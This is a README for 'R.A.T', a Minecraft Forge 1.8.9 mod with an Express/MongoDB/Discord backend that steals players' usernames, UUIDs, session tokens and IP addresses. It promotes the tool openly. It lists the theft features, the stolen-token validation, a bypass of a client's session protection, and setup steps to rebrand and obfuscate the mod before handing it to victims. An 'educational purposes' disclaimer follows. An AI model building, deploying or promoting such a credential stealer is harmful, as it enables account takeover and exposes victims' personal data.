<div align="center">

# R.A.T

<img src="https://bigrat.monster/media/bigrat.png" alt="logo" width="25%" />

**Retrieve Access Token**

![](https://img.shields.io/badge/MC--VERSION-FORGE_1.8.9-0?style=for-the-badge)
![](https://img.shields.io/badge/Express.js-000000?style=for-the-badge&logo=express&logoColor=white)
![](https://img.shields.io/badge/MongoDB-4EA94B?style=for-the-badge&logo=mongodb&logoColor=white)
![](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)

</div>

> Check [DxxxxY/TokenAuth](https://github.com/DxxxxY/TokenAuth) to login into an MC account with a name, token and uuid combo.

## Features
- Grabs the **username, uuid, token and ip** of a target as a *JSON*.
- Additionally, it stores a **formatted session string** ready to use with [DxxxxY/TokenAuth](https://github.com/DxxxxY/TokenAuth).
- JavaScript backend server which:
  - Checks if all fields in the json are present.
  - Validates the token before proceeding.
  
  therefore filtering out spam requests and fake data.
- Makes nuking/trolling impossible, due to webhook/database urls private.
- Can be easily be hosted on *Heroku*.
- Can be easily configured to either use `Discord Webhooks` or `MongoDB` or both.
- Bypasses PizzaClient's SessionProtection.

- Uses:
  - *Express* for the backend server.
  - *MongoDB* for storing ratted users.
  - *Discord API* for sending messages to webhook.

## What the embed looks like
![https://media.discordapp.net/attachments/976320588819869716/990094168166658089/unknown.png?width=587&height=700](embed)

## Setup
> A video tutorial is available [here](https://youtu.be/JWoBSp8XU_8).
- Server
  1. Clone the repository.
  2. Install dependencies.
  3. Create a .env file with your webhook/database url.
  3. Run the server (don't forget to change some strings).

- Mod
  1. Follow [1.8.9ForgeTemplate#setup](https://github.com/DxxxxY/1.8.9ForgeTemplate#setup) to setup your mod environment.
  2. Change url to your server and change some other stuff to make it ✨unique✨.
  3. Build the mod.
  4. (Optional) Obfuscate the mod.

## Disclaimer
This is for educational purposes only. I am not responsible for any damage caused by this tool.

## License
GPLv3 © dxxxxy
